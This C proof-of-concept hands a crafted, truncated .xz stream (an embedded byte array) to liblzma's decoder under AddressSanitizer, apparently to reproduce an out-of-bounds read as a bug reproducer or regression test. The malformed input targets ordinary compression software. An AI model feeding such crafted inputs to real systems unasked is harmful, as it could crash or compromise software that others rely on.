// PoC: crafted .xz stream handed to the public liblzma stream decoder.
//
// The .xz stream is truncated: its single LZMA2 chunk declares a
// compressed size whose bytes are all present in the buffer, but the
// LZMA stream inside the chunk is incomplete (it needs more input than
// the chunk contains). A decoder must handle this gracefully: report an
// error or wait for more input.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <lzma.h>

// Make sure a sanitizer error terminates the process with SIGABRT
// even when ASAN_OPTIONS isn't set in the environment.
const char *
__asan_default_options(void)
{
	return "abort_on_error=1";
}

static const uint8_t input[] = {
	0xFD, 0x37, 0x7A, 0x58, 0x5A, 0x00, 0x00, 0x01, 0x69, 0x22, 0xDE, 0x36,
	0x02, 0x00, 0x21, 0x01, 0x14, 0x00, 0x00, 0x00, 0xFF, 0xE7, 0xEC, 0x09,
	0xE3, 0x0D, 0x3F, 0x00, 0x3F, 0x5D, 0x00, 0x00, 0x00, 0x52, 0x50, 0x0A,
	0x84, 0xF9, 0xB0, 0xC2, 0xBA, 0x56, 0xA4, 0x83, 0x70, 0x17, 0xC4, 0x79,
	0xDB, 0xAE, 0xAC, 0x4D, 0xBF, 0x69, 0x9F, 0x62, 0xEE, 0x6C, 0x7C, 0x72,
	0x27, 0x8E, 0x09, 0x00, 0xB6, 0x7F, 0x24, 0x70, 0x0D, 0x10, 0xB3, 0xE9,
	0xD0, 0x3F, 0xD0, 0x37, 0x3E, 0x34, 0x52, 0x49, 0x11, 0x14, 0x4E, 0x7B,
	0xE7, 0xB0, 0x51, 0x0D, 0x23, 0x32, 0xDC, 0x03, 0xF4, 0x82,
};

int
main(void)
{
	// Heap-allocate an exact-size copy of the input so that any
	// out-of-bounds read is caught by the sanitizer.
	uint8_t *in = malloc(sizeof(input));
	if (in == NULL)
		return 1;
	memcpy(in, input, sizeof(input));

	const size_t out_size = 4 * 1024 * 1024;
	uint8_t *out = malloc(out_size);
	if (out == NULL)
		return 1;

	lzma_stream strm = LZMA_STREAM_INIT;
	lzma_ret ret = lzma_stream_decoder(&strm, UINT64_MAX, 0);
	if (ret != LZMA_OK) {
		fprintf(stderr, "lzma_stream_decoder: %d\n", (int)ret);
		return 1;
	}

	strm.next_in = in;
	strm.avail_in = sizeof(input);
	strm.next_out = out;
	strm.avail_out = out_size;

	while (ret == LZMA_OK && strm.avail_in > 0)
		ret = lzma_code(&strm, LZMA_RUN);

	printf("ret=%d consumed=%zu produced=%zu\n", (int)ret,
			sizeof(input) - strm.avail_in,
			out_size - strm.avail_out);

	lzma_end(&strm);
	free(out);
	free(in);
	return 0;
}
